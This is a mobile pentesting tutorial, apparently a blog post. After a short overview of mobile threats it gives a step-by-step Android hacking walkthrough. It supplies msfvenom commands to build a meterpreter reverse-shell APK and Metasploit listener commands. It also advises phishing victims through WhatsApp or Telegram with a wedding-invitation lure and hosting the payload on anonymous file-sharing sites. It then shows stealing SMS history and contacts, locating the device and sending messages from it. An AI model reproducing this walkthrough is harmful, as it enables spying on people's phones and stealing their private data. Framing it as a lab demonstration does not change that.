![](publish/attachments/Mobile%20Pentest%20(Android)%20by%20RAWSEC-1.png)
### Mobile Threats
#### Device
These threats target the physical mobile device or its operating system. They include unauthorized access through weak or **stolen passwords**, exploitation of OS vulnerabilities to gain control or escalate privileges, **rooting or jailbreaking** that removes built-in security restrictions, and physical theft or loss leading to data exposure. Attackers may also exploit device features like **Bluetooth** or **NFC** to **inject malicious code** or intercept data. Additionally, malicious apps installed on the device can **abuse permissions** to access sensitive information or functionalities.
#### Network
Mobile devices often connect to various networks, including public Wi-Fi, cellular networks, and bluetooth connections, which expose them to network-based attacks. **Man-in-the-middle (MitM)** attacks are common, where attackers intercept or alter communications between the device and servers, potentially **stealing credentials** or **injecting malware**. Rogue Wi-Fi hotspots mimic legitimate networks to lure devices into connecting, enabling data interception. Network spoofing, session hijacking, and DNS poisoning are other network threats that compromise data integrity and confidentiality. Mobile devices are also vulnerable to attacks exploiting weak encryption or unsecured protocols.
#### Malware
Malware specifically designed for mobile platforms includes viruses, worms, trojans, ransomware, spyware, adware, and cryptojackers. These malicious programs can be **delivered via infected apps**, **malicious links**, or **compromised websites**. Once installed, malware can **steal personal data**, **track user activity**, **send premium SMS messages**, **encrypt files for ransom**, or use device resources for **cryptomining**. Mobile malware often exploits OS vulnerabilities or social engineering tactics to bypass security measures. Some malware variants can propagate through messaging apps or Bluetooth, increasing their spread.

### Type Of Mobile App
- APK - Android Application Package
- IPA - iOS AppStore Package
### Tools For Mobile Pentest
**For Both**
- BurpSuite / OWASP ZAP - Proxy Traffic
- Wireshark  / tcpdump - Network Analysis
#### Reverse Engineering
<font color="#9bbb59">Used for static analysis, analyze app behavior through code analysis without executing the app</font>
**APK File**
- Android Studio
- Ghidra

**IPA File**
- Testflight
- Ghidra
### Mobile App Software Development Kit(SDK)
- Flutter
- Java
- Native
- JavaScript

### Mobile App Host Server
Best Practice : Separate these sectors to different server
- Web
- App
- Database

#### Type Of Environment
- Environment 1: Production
- Environment 2: Disaster Recovery (DR)
- Environment 3: System Integration Testing (SIT)
- Environment 4: User Acceptance Testing (UAT)

## PoC Android Hacking

### 1. Environment configuration
**Virtual Phone** (Optional)
- We're using medium phone template on Android Studio with API level 30. This older version of android used outdated security features, making it easier for us to demonstrate this hack.

![](publish/attachments/Mobile%20Pentest%20(Android)%20by%20RAWSEC-5.png)

**Network**
i. Make sure both Kali Linux / attacker machine is connected under the same network as victim
(We could use port-forwarding like Ngrok, but it's too complicated for now. So we keep it traditional)
	- Make sure our VM NIC is set to Bridged Network
**p.s: I'm not recommending to use Bridged network connection for normal usage because of security purposes, this mode only used for our demonstration only**

![](publish/attachments/Mobile%20Pentest%20(Android)%20by%20RAWSEC-2.png)

ii. Checking our ip range in Kali / attacker machine & victim device
**P.S** : 
If you're using a virtual phone on host machine, you can follow this method since virtual phone shared the same network with host machine. In simple term, the virtual phone use same wifi as your computer.
But if you're using a physical phone, you can check it through settings, ensuring you're on the same network as attacker machine.

**Kali Linux**
```
ifconfig
```
![](publish/attachments/Mobile%20Pentest%20(Android)%20by%20RAWSEC-3.png)

**Host / Victim Machine**
```
ipconfig /all
```
![](publish/attachments/Mobile%20Pentest%20(Android)%20by%20RAWSEC-4.png)

iii. As can see here, both Kali Linux and Host machine shared the IP range
### 2. Build our malicious payload
First of all, we are blessed with the existence of **msfvenom** (metasploit payload generator) which saved us from 1001 steps of building our very own payload.

**What is malicious payload?**
In this context, the malicious payload is a malicious app that will be install in victim's device. The application contains malicious features, such as establishing a reverse shell to attacker machine. Besides, this malicious app helps provide us permission such as, Camera, Contact, SMS, and etc.
That helped us expand our attack surface. 

**Why we need to plant this malicious app in target's device?**
Metaphorically, most of us know what is spy. Spy is an espionage agent that disguise itself as a normal people in the crowd.  A spy takes information and send back to his associate. It's hard for law enforcement to differentiation a spy and normal people. In our context, malicious app is a spy. It disguise itself as a legit app, takes information and monitoring user's activity and send it to attacker. Sometimes, it's hard for anti-virus / protection software to detect these activities.

Let's back on track, to create our payload, we can use msfvenom using this command
```
msfvenom -p android/meterpreter/reverse_tcp LHOST=<your_local_IP> LPORT=4444 -o appname.apk
```
![](publish/attachments/Mobile%20Pentest%20(Android)%20by%20RAWSEC-6.png)

For this demonstration, I'll use the well-known phishing technique "Kad Kahwin Digital".

Let's try to under what does this command means
-p argument stands for payload, we specify the payload we want to use, which is Meterpreter reverse TCP for Android.
-LHOST argument stands for localhost, we specify where the connection will be established.
-LPORT argument stands for local port, from which port the communication will be established
-o argument stands for output, what the payload will be named and where to be saved.

### 3. Send The Payload
There's a lot of ways to send the payload. One of the famous way is through WhatsApp and Telegram, which is common way of phishing nowadays.

This is where the Art of Manipulation, Social Engineering and PSYOP comes to play. We have to gain trust of the victim to install the application on their device. There's a lot of ways to play around with human emotion like what she did to me (JK) that able to convince them to install the app.

For this demonstration, i don't want to make it complicated. I'll just online file-sharing service like wormhole.app, anonfile.la.

### 4. Configure the listener
Before the payload start to work, we should enable / start the listener first. Making sure that once the payload send the request, our attacker machine is ready the accept the connection.

**Attacker POV:**
![](publish/attachments/Mobile%20Pentest%20(Android)%20by%20RAWSEC-11.png)

```
msfconsole

use exploit/multi/handler

set payload android/meterpreter/reverse_tcp

set LHOST <your local IP>

setÂ  LPORT 4444

run
```
### 5. Payload Installation & Permission Giveaway

**Attacker POV:**
We hosted the payload on online file sharing platform, the link will be accessed by victim
![](publish/attachments/Mobile%20Pentest%20(Android)%20by%20RAWSEC-8.png)

**Victim POV:**
Victim download and install the apk file containing payload that we shared
![](publish/attachments/Mobile%20Pentest%20(Android)%20by%20RAWSEC-9.png)

#### 5.1 Permission Take Over
Here the last gateway of turning back. Once the victim click continue, the app will given permission that later will be used in exploit phase.

**Victim POV:**
![](publish/attachments/Mobile%20Pentest%20(Android)%20by%20RAWSEC-10.png)

### 6. Running the malicious app
Once victim run the application. Nothing unusual will happen at victim pov, but connection will be established on the background to the attacker.

**Victim POV:**
Nothing unusual
![](publish/attachments/Mobile%20Pentest%20(Android)%20by%20RAWSEC-12.png)

**Attacker POV:**
We successfully establish connection with victim phone. There's a lot of things we could do from here.
![](publish/attachments/Mobile%20Pentest%20(Android)%20by%20RAWSEC-13.png)

### 7. Attacker ability on victim device
There's tons of features provided by meterpreter that we could use on victim phone, such as sending SMS, upload files, extract SMS, extract call log, etc.

#### Send message
Attacker POV:
![](publish/attachments/Mobile%20Pentest%20(Android)%20by%20RAWSEC-14.png)

Victim POV:
![](publish/attachments/Mobile%20Pentest%20(Android)%20by%20RAWSEC-15.png)

#### Root Status Check
![](publish/attachments/Mobile%20Pentest%20(Android)%20by%20RAWSEC-16.png)

#### Locate Device
P.S: not really accurate
![](publish/attachments/Mobile%20Pentest%20(Android)%20by%20RAWSEC-17.png)

#### Extract SMS History
![](publish/attachments/Mobile%20Pentest%20(Android)%20by%20RAWSEC-18.png)

#### Extract contacts
![](publish/attachments/Mobile%20Pentest%20(Android)%20by%20RAWSEC-19.png)